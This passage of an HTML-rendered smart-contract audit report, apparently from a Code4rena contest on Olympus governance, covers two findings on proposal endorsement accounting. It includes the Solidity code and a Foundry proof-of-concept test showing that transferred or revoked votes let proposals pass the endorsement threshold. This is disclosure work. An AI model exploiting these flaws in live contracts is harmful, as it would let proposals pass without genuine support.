class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalEndorsed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">activateProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ProposalMetadata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">getProposalMetadata</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">submitter</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAuthorizedToActivateProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">submissionTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">ACTIVATION_DEADLINE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SubmittedProposalHasExpired</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] * </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) &lt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">ENDORSEMENT_THRESHOLD</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotEnoughEndorsementsToActivateProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalAlreadyActivated</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activationTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">GRACE_PERIOD</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ActiveProposalNotExpired</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ActivatedProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalActivated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please append the following test in <code>src\\test\\policies\\Governance.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testScenario_UserEndorsesAfterReceivingTransferredVotes</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_submitProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// to simulate calling gOHM&#39;s transfer function by voter2 for sending votes to voter0, VOTES.transferFrom is called by governance here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">200</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter0 uses the votes previously owned by voter2 to endorse the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the proposal is endorsed with 400 votes but only the 200 votes originally owned by voter2 are used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter0</span><span class=\"mtk1\">), </span><span class=\"mtk7\">200</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">), </span><span class=\"mtk7\">200</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">400</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// At this moment, the proposal can be activated successfully.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// However, if it is endorsed with only 200 votes, it cannot satisfy ENDORSEMENT_THRESHOLD and cannot be activated.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalActivated</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">activateProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When calling <code>endorseProposal</code>, the user’s votes can be locked by transferring these votes to the governance so the user cannot transfer these anymore to another user after the endorsement. An additional function can be added for reclaiming the endorsed votes back to the user and reducing the proposal’s endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/239#issuecomment-1235877496\">fullyallocated (Olympus) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Taken from another issue:</p>\n<blockquote>\n<p>This is true, and I appreciate the throughness of the explanation—it’s hard to adjust endorsements based on the user’s balance because there’s no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there’s a warmup period + cooldown period to mitigate this issue.</p>\n</blockquote>\n</blockquote>\n<hr>\n<h2 id=\"m-07-endorsed-votes-by-a-user-do-not-decrease-after-the-users-votes-are-revoked\" style=\"position:relative;\"><a href=\"#m-07-endorsed-votes-by-a-user-do-not-decrease-after-the-users-votes-are-revoked\" aria-label=\"m 07 endorsed votes by a user do not decrease after the users votes are revoked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/257\">[M-07] Endorsed votes by a user do not decrease after the user’s votes are revoked</a></h2>\n<p><em>Submitted by rbserver</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201</a></p>\n<p>The voter admin can call the following <code>revokeVotesFrom</code> function to revoke a user’s votes, which also decreases the total supply of the votes, after the user endorses a proposal through calling the <code>endorseProposal</code> function below. Because <code>endorseProposal</code> can be called multiple times, the user has the incentive to call it for endorsing the proposal again with the new votes minted by the <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48\"><code>issueVotesTo</code></a> function. However, after the user’s votes are revoked, the user has no incentive to call <code>endorseProposal</code> again. Hence, the endorsed votes by the user for the proposal does not decrease after the user’s votes are revoked. When determining whether the proposal can be activated or not, its old endorsed votes, which is not decreased, are compared against the new total supply of the votes, which is decreased because of the <code>revokeVotesFrom</code> call. As a result, the proposal is unreliably more likely to satisfy the condition for being activated.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">revokeVotesFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter_admin&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Revoke the votes in the VOTES module</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseNullProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getInstructions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">instructions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseInvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// undo any previous endorsement the user made on these instructions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousEndorsement</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">previousEndorsement</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// reapply user endorsements with most up-to-date votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">userEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalEndorsed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 